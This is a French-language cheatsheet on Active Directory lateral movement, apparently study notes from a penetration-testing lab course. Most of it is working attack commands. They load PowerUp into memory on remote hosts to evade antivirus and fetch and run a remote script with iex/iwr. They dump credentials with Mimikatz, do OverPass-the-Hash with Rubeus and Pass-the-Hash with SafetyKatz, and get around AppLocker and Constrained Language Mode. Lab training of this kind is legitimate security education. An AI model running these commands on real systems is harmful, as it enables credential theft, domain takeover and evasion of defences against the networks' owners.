# Cheatsheet - Lateral movement

> [!summary] Objectif
> Passer d'une machine à une autre en rejouant des creds sans mot de passe clair, ou en atteignant un hôte où une session privilégiée traîne déjà.

> [!abstract] Pourquoi · Chaînage
> **Exploiter** un cred/hash déjà volé pour atteindre une **nouvelle machine** (sans mdp clair) ou une session privilégiée qui y traîne.
> **Prérequis** hash/clé/mdp ([[Cheatsheet - Post-exploitation]]) → **débloque** une nouvelle machine / identité.

### Basic remote access

```powershell
Enter-PSSession -ComputerName <TARGET> -Credential <DOMAIN>\<USER>
winrs -r:<TARGET> cmd
```

### Lancer un .ps1 local sur box distante SANS drop de fichier (PATTERN CLÉ)

> [!important] `Invoke-Command -FilePath` = script chargé **en mémoire dans le WSMprovhost.exe distant**, jamais écrit sur disque cible → **aucune détection AV file-based**, aucun cleanup à faire.
> Le prérequis c'est **admin sur la cible** (droit de créer une PSSession), pas admin dessus = `Access denied` avant même le -FilePath.

```powershell
# 1. PSSession persistante (obligatoire pour enchaîner les commandes)
$s = New-PSSession -ComputerName <target>

# 2. Charge le .ps1 LOCAL dans la runspace DISTANTE (contenu textuel envoyé, pas de fichier)
Invoke-Command -Session $s -FilePath C:\AD\Tools\PowerUp.ps1

# 3. Toutes les fonctions du .ps1 sont maintenant dispos dans $s
Invoke-Command -Session $s -ScriptBlock { Invoke-AllChecks }
Invoke-Command -Session $s -ScriptBlock { Invoke-ServiceAbuse -Name '<svc>' -UserName 'dcorp\student426' }

# 4. Cleanup session (le contenu du .ps1 disparaît avec)
Remove-PSSession $s
```

> [!warning] Piège critique — persistance des fonctions
> Chaque `Invoke-Command` **SANS** `-Session` crée un runspace **jetable** → les fonctions chargées disparaissent immédiatement. Symptôme : `Invoke-Command -ComputerName X -FilePath tool.ps1` marche, puis `Invoke-Command -ComputerName X -ScriptBlock { Invoke-AllChecks }` renvoie `not recognized`.
> **Fix** : TOUJOURS passer par `New-PSSession` → `-Session $s` sur toutes les étapes → `Remove-PSSession $s` à la fin.

**Variantes équivalentes selon contexte** :

```powershell
# A. one-shot base64 (utile en Jenkins build step ou pipeline sans persistance)
$b64 = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes((Get-Content C:\AD\Tools\PowerUp.ps1 -Raw)))
Invoke-Command -ComputerName <target> -ScriptBlock {
  param($b64)
  iex ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($b64)))
  Invoke-AllChecks
} -ArgumentList $b64

# B. héberger sur Jenkins userContent (cf LO07 exfil, mais dans l'autre sens) — utile si tu veux qu'une box distante récupère le .ps1 elle-même
Invoke-Command -ComputerName <target> -ScriptBlock {
  iex (iwr http://dcorp-ci:8080/userContent/PowerUp.ps1 -UseBasicParsing)
  Invoke-AllChecks
}

# C. drop temporaire (si tu as besoin d'un .exe et pas seulement d'un .ps1)
Copy-Item -ToSession $s -Path C:\AD\Tools\Invoke-Mimi.ps1 -Destination C:\Users\Public\
Invoke-Command -Session $s -ScriptBlock {
  . C:\Users\Public\Invoke-Mimi.ps1
  Invoke-Mimi -Command '"privilege::debug" "sekurlsa::logonpasswords"'
  Remove-Item C:\Users\Public\Invoke-Mimi.ps1 -Force
}
```

**Quand utiliser quoi :**
| Situation | Méthode |
|-----------|---------|
| Enchaîner plusieurs cmdlets d'un même tool (PowerUp, PowerView, Invoke-Mimi) | **`-Session $s` + `-FilePath` (A)** |
| One-shot dans un Jenkins build (pas de PSSession dispo) | **base64 (variante A)** |
| Box distante doit se servir elle-même (out-of-band) | **iwr userContent (variante B)** |
| `.exe` obligatoire (Rubeus, SharpHound, SafetyKatz) | **Copy-Item -ToSession + drop temp (variante C)**, ou reflectively load en mémoire (`[Reflection.Assembly]::Load([IO.File]::ReadAllBytes(...))` — cf [[LO07 - Session DA et escalade]] étape 8) |

> [!tip] Piège double-hop (Kerberos)
> `-FilePath` marche parce que Kerberos délègue tes creds au 1er hop (WinRM). MAIS si le .ps1 distant essaie à son tour d'accéder à une autre box (`Invoke-Command depuis la PSSession`, `\\autre-serveur\share`) → **`Access denied`** (double-hop bloqué). Workaround : OverPass-the-Hash dans la PSSession, `-Credential` explicite, ou activer CredSSP.

> [!danger] Piège AppLocker → Constrained Language Mode (CLM) — MAJEUR sur ce lab
> Sur les box AppLocker'd (dans ce lab : **`dcorp-adminsrv`**, OU `Applocked`), la PSSession démarre en **`ConstrainedLanguage`** → méthodes .NET, `[Reflection.Assembly]::Load()`, `Add-Type`, `New-Object` de types non-core = **tous bloqués**. Symptôme :
> ```
> Cannot invoke method. Method invocation is supported only on core types in this language mode.
> FullyQualifiedErrorId : MethodInvocationNotSupportedInConstrainedLanguage
> ```
> **PowerUp, PowerView, Invoke-Mimi, reflectively-load de Rubeus** → tous en carafe si tu les charges via `-FilePath` dans une session CLM.
>
> **Diagnostic** :
> ```powershell
> Invoke-Command -Session $s -ScriptBlock { $ExecutionContext.SessionState.LanguageMode }
> ```
> → `ConstrainedLanguage` = confirmé.
>
> **⚠ Sous-piège : `Copy-Item -ToSession` est LUI-MÊME bloqué en CLM** (`SessionIsNotInFullLanguageMode`). Il faut push le fichier **via SMB UNC**, en dehors de la PSSession :
> ```powershell
> # depuis student VM (FullLanguage), écrit directement sur C$ de la cible (admin local requis)
> Copy-Item C:\AD\Tools\PowerUp.ps1 -Destination "\\dcorp-adminsrv.dollarcorp.moneycorp.local\C$\Windows\Tasks\PowerUp.ps1"
> ```
> Après SMB push, dot-source dans la PSSession :
> ```powershell
> Invoke-Command -Session $s -ScriptBlock {
>   . C:\Windows\Tasks\PowerUp.ps1                       # dot-source depuis path autorisé
>   $ExecutionContext.SessionState.LanguageMode          # devrait passer à FullLanguage
>   Invoke-AllChecks
> }
> ```
>
> **Bypass 2 — lister les paths autorisés par la policy effective** :
> ```powershell
> Invoke-Command -Session $s -ScriptBlock {
>   Get-AppLockerPolicy -Effective -Xml | Out-File C:\Windows\Tasks\policy.xml
>   Select-String C:\Windows\Tasks\policy.xml -Pattern "<FilePathCondition"
> }
> ```
> Autres paths souvent OK : `%WINDIR%\Temp`, `%WINDIR%\System32\spool\drivers\color\`, `C:\Windows\System32\Tasks\`.
>
> **Bypass 3 — LOLBINs qui bypassent CLM** : `InstallUtil.exe`, `MSBuild.exe`, `regsvr32` (scriptlet via HTTP). Réservé aux blocages durs.
>
> **Ce qui marche EN CLM sans bypass** : cmdlets natives Windows (`Get-Service`, `Get-WmiObject`, `Get-CimInstance`, `Get-Process`, `netstat`, `sc.exe`, `vaultcmd`, `cmdkey`, `net`, `whoami`, `klist`) → suffisant pour de l'énum pure, insuffisant pour du privesc-tooling.

### Après `Find-PSRemotingLocalAdminAccess`

Il liste les hôtes où **ton identité courante** est admin via PSRemoting. `Enter-PSSession -ComputerName <TARGET>` → tu es sur la box : tape les commandes **direct** (`whoami /all`, `klist`, dump), puis re-hunt → saut suivant (vers DA). Compte **dumpé** ≠ user courant → OverPass-the-Hash d'abord (ci-dessous).

> [!warning] Pièges PSRemoting
> - **Double-hop** : tes creds ne franchissent pas un 2e saut réseau → `Access denied`. Donc ne refais **pas** `Invoke-Command -ComputerName <box>` *depuis l'intérieur* de la session. Franchir : OverPass-the-Hash **dans** la session, `-Credential`, ou CredSSP.
> - `Enter-PSSession` qui marche = *Remote Management Users*, **pas** forcément admin → vérifie `whoami /groups`. Admin local suffit pour dumper.
> - Charger un outil sans 2e hop : `Copy-Item tool.ps1 -ToSession $sess`.

### OverPass-the-Hash (rejouer un hash/clé AES en TGT)

> Permet de devenir intégralement le compte visé (toute action Kerberos : `winrs`, partages, autres tickets) à partir d'un simple hash/clé AES volé — jamais besoin de casser ni de connaître le mot de passe en clair pour l'utiliser.

> [!warning]- Required
> Hash NTLM ou clé AES du compte ciblé — s'obtient par DCSync ou extraction locale, voir [[Cheatsheet - Persistence]].

```powershell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:<key> /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Toute commande lancée dans le process spawné (`winrs`, `xcopy`) s'exécute avec les privilèges de `svcadmin`.

### Pass-the-Hash (rejouer un NTLM sans passer par Kerberos)

> Utile quand OverPass-the-Hash n'est pas applicable : compte **local** (DSRM sur le DC, flag F20), ou validation directe du hash Administrator de domaine (flag F17) sans forger de ticket.

```powershell
# Domaine (F17) — spawner un process sous l'identité du DA
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::pth /user:Administrator /domain:<DOMAIN> /ntlm:<NTLM> /run:powershell.exe" "exit"

# DSRM (F20) — compte LOCAL du DC, pas de domaine AD
C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "sekurlsa::pth /domain:<DC_MACHINE_NAME> /user:Administrator /ntlm:<DSRM_NTLM> /run:powershell.exe" "exit"

# depuis le shell qui s'ouvre :
dir \\dcorp-dc.dollarcorp.moneycorp.local\C$
```

### Bypass AppLocker avec Invoke-MimiEx

Quand `Loader.exe` est bloqué par AppLocker sur la cible mais que le dot-sourcing `.ps1` reste autorisé : copier `Invoke-Mimi.ps1`, y coller l'appel de fonction directement dans le script (`Invoke-Mimi -Command '"sekurlsa::ekeys"'`), le transférer et l'exécuter par dot-source sur l'hôte cible plutôt que de lancer un binaire.

> [!note] Si les identifiants sont déjà présents dans la session, éviter d'en ajouter en clair sur la ligne de commande.

**Link**
- [[Cheatsheet - Privilege escalation]]
- [[Cheatsheet - Post-exploitation]]
- [[Cheatsheet - Tickets Kerberos]]
- [[What is PowerShell]]
